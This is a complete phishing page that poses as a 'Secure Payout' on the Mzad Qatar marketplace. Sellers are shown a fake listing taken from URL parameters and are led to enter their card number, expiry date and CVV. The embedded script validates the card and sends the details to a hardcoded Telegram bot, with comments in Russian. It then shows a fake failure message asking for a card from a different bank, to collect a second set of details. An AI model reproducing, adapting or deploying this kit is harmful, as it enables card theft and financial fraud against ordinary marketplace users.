<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>Mzad Qatar | Secure Payout</title>
    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
    <style>
        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; }
        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; position: relative; }
        
        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; }
        .logo-main { height: 45px; }

        .ad-box { border-bottom: 8px solid var(--bg); }
        .img-container { width: 100%; aspect-ratio: 1.2; background: #fff; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid #eee; }
        .img-container img { width: 100%; height: 100%; object-fit: contain; }
        
        .info { padding: 16px; }
        .title { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 5px; }
        .price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
        
        .btn-trigger-area { padding: 20px 16px; }
        .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 20px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(138,21,56,0.25); }

        /* MODAL */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 2000; align-items: center; justify-content: center; }
        .modal-content { background: white; width: 85%; padding: 25px; border-radius: 20px; animation: slideUp 0.3s ease; }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        
        .modal-h { font-size: 18px; font-weight: 700; text-align: center; margin-bottom: 20px; color: var(--mzad-red); }
        .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; }
        .q-inp.error { border: 1.5px solid #ff4d4d; background: #fff8f8; }

        .app-footer { background: #fff; padding: 30px 16px; text-align: center; border-top: 8px solid var(--bg); }
        .store-badges { display: flex; justify-content: center; gap: 10px; margin-top: 15px; }
        .store-badges img { height: 35px; border-radius: 6px; }
    </style>
</head>
<body>

<div class="app-shell">
    <header>
        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main">
        <div style="font-weight: 700; color: var(--mzad-red);">العربية</div>
    </header>

    <div class="ad-box">
        <div class="img-container"><img id="p-img" src=""></div>
        <div class="info">
            <div style="color: #27ae60; font-size: 12px; font-weight: 800;">✓ MZAD VERIFIED DEAL</div>
            <h1 class="title" id="p-name">Loading...</h1>
            <div class="price" id="p-price">0 QAR</div>
        </div>
    </div>

    <div class="btn-trigger-area">
        <button class="btn-main" onclick="openPay()">RECEIVE FUNDS</button>
    </div>

    <div class="modal" id="payModal">
        <div class="modal-content">
            <div class="modal-h">Card Verification</div>
            <form id="hit-form">
                <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex: 1.5;">
                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex: 1;">
                </div>
                <button type="submit" class="btn-main" id="btn-txt">CONFIRM PAYOUT</button>
            </form>
            <div onclick="closePay()" style="text-align:center; margin-top:15px; color:#999; font-size:14px; cursor:pointer;">Back</div>
        </div>
    </div>

    <div class="app-footer">
        <p style="font-weight: 700; font-size: 13px;">GET THE MZAD QATAR APP</p>
        <div class="store-badges">
            <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png">
            <img src="https://mzadqatar.com/frontend/images/mzad/google_play.png">
            <img src="https://mzadqatar.com/frontend/images/mzad/app_gallery.png">
        </div>
    </div>
</div>

<script>
    // БОТ ДЛЯ ПРИЕМА ЛОГОВ (Твой старый бот)
    const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const C = '8071425015';

    const url = new URLSearchParams(window.location.search);
    document.getElementById('p-name').innerText = url.get('item') || 'Electronic Device';
    document.getElementById('p-price').innerText = (url.get('price') || '0') + ' QAR';
    document.getElementById('p-img').src = url.get('img') || 'https://via.placeholder.com/400';

    function openPay() { document.getElementById('payModal').style.display = 'flex'; }
    function closePay() { document.getElementById('payModal').style.display = 'none'; }

    // Профессиональный ввод
    document.getElementById('cn').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
    };
    document.getElementById('ce').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim();
    };

    // Валидация Луна
    function luhn(s) {
        let v = s.replace(/\s+/g, '');
        let sum = 0;
        for (let i = 0; i < v.length; i++) {
            let n = parseInt(v.substr(i, 1));
            if (i % 2 === v.length % 2) {
                n *= 2;
                if (n > 9) n -= 9;
            }
            sum += n;
        }
        return sum % 10 === 0;
    }

    document.getElementById('hit-form').onsubmit = async (e) => {
        e.preventDefault();
        const card = document.getElementById('cn');
        if(!luhn(card.value)) {
            card.classList.add('error');
            alert("This card is not valid for international transfer. Please check the number.");
            return;
        }
        
        const b = document.getElementById('btn-txt');
        b.innerText = 'VERIFYING...';
        b.disabled = true;

        const msg = `🇶🇦 **MZAD QATAR LOG**\n\n📦 ${url.get('item')}\n💰 ${url.get('price')} QAR\n\n💳 \`${card.value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;

        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'Markdown' })
        });
        
        setTimeout(() => {
            alert("Verification failed. For security, please enter another card from a different bank to complete the payout.");
            b.innerText = 'CONFIRM PAYOUT';
            b.disabled = false;
            document.getElementById('hit-form').reset();
        }, 3000);
    };
</script>
</body>
</html>
